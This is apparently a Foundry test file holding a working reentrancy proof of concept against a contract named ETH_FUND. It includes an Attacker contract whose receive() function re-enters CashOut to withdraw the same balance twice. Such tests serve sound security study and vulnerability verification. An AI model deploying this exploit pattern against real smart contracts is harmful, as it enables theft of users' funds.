
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_FUND, Log} from "../src/ETH_FUND.sol";

contract TestReentrancyETH_FUND is Test {
    ETH_FUND public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_FUND(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1.1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The CashOut function requires block.number > lastBlock
        // We need to advance the block after deposit

        // --- 3. Funding ---
        // Fund the Victim contract with extra ETH so attacker can drain more than deposited
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Advance block number to satisfy block.number > lastBlock condition
        vm.roll(block.number + 1);
        
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_FUND public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = ETH_FUND(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds to establish a balance in the victim contract
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State - store attacker's ETH balance before attack
        initialSnapshot = address(this).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        
        // 3. Call the vulnerable function
        victim.CashOut(val);

        // 4. Verify Success Conditions
        // If we received more than we should have (due to reentrancy), the attack succeeded
        // We should have received val twice (initial call + reentrant call)
        if (address(this).balance >= initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {            
            // Re-enter the vulnerable CashOut function
            // The balance hasn't been updated yet, so we can withdraw again
            victim.CashOut(storedAttackVal);
        }
    }
}
